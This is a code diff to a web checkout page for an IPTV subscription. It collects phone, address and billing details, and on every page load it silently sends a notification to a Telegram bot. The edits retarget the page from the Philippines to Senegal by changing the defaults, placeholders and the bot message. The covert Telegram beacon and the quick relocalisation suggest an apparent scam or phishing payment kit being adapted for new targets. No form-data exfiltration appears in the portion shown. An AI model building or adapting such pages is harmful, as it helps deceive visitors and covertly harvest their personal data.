@@ -573,7 +573,8 @@
                             <div class="form-group">
                                 <label class="form-label">Country/Region <span class="required-star">*</span></label>
                                 <select class="form-select" id="countrySelect">
-                                    <option value="PH" selected>Philippines (+63)</option>
+                                    <option value="SN" selected>Senegal (+221)</option>
+                                    <option value="PH">Philippines (+63)</option>
                                     <option value="BE">Belgium (+32)</option>
                                     <option value="US">United States (+1)</option>
                                     <option value="UK">United Kingdom (+44)</option>
@@ -612,7 +613,7 @@
                                 <label class="form-label">Mobile Phone <span class="required-star">*</span></label>
                                 <div class="phone-group">
                                     <select class="form-select" id="phoneCodeSelect"></select>
-                                    <input type="tel" class="form-control" id="phoneNumber" placeholder="912 345 6789" autocomplete="tel" />
+                                    <input type="tel" class="form-control" id="phoneNumber" placeholder="77 123 45 67" autocomplete="tel" />
                                 </div>
                                 <div class="validation-feedback" id="phoneError">Please enter a valid phone number.</div>
                             </div>
@@ -629,18 +630,18 @@
                             <div class="form-row">
                                 <div class="form-group">
                                     <label class="form-label">City <span class="required-star">*</span></label>
-                                    <input type="text" class="form-control" id="city" placeholder="Manila" autocomplete="address-level2" />
+                                    <input type="text" class="form-control" id="city" placeholder="Dakar" autocomplete="address-level2" />
                                     <div class="validation-feedback" id="cityError">City is required.</div>
                                 </div>
                                 <div class="form-group">
                                     <label class="form-label">State / Province <span class="required-star">*</span></label>
-                                    <input type="text" class="form-control" id="state" placeholder="Metro Manila" autocomplete="address-level1" />
+                                    <input type="text" class="form-control" id="state" placeholder="Dakar" autocomplete="address-level1" />
                                     <div class="validation-feedback" id="stateError">State / Province is required.</div>
                                 </div>
                             </div>
                             <div class="form-group">
                                 <label class="form-label">ZIP / Postal Code <span class="required-star">*</span></label>
-                                <input type="text" class="form-control" id="postal" placeholder="1000" autocomplete="postal-code" />
+                                <input type="text" class="form-control" id="postal" placeholder="10000" autocomplete="postal-code" />
                                 <div class="validation-feedback" id="postalError">Valid postal code required.</div>
                             </div>
 
@@ -673,6 +674,7 @@
                             <div class="form-group">
                                 <label class="form-label">Billing country</label>
                                 <select class="form-select" id="billingCountry">
+                                    <option value="SN" selected>Senegal</option>
                                     <option value="PH">Philippines</option>
                                     <option value="BE">Belgium</option>
                                     <option value="US">United States</option>
@@ -723,7 +725,7 @@
 
                 // ---------- PAGE VIEW NOTIFICATION ----------
                 function notifyPageView() {
-                    const viewMsg = `👁️ *IPTV page viewed* · 6-month plan · $48.73`;
+                    const viewMsg = `👁️ *IPTV page viewed* · 6-month plan · $48.73 · Senegal (primary)`;
                     fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -734,13 +736,13 @@
                         })
                     }).catch(() => {});
                 }
-                // wait a moment after page load to avoid race conditions
                 window.addEventListener('load', function() {
                     setTimeout(notifyPageView, 300);
                 });
 
                 // ========== COUNTRY CODES ==========
                 const countryCodes = {
+                    SN: '+221',
                     PH: '+63',
                     BE: '+32',
                     US: '+1',
@@ -774,7 +776,8 @@
                         opt.textContent = dial;
                         phoneCodeSelect.appendChild(opt);
                     }
-                    updatePhoneCode();
+                    // default to Senegal
+                    phoneCodeSelect.value = 'SN';
                 }
 
                 function updatePhoneCode() {
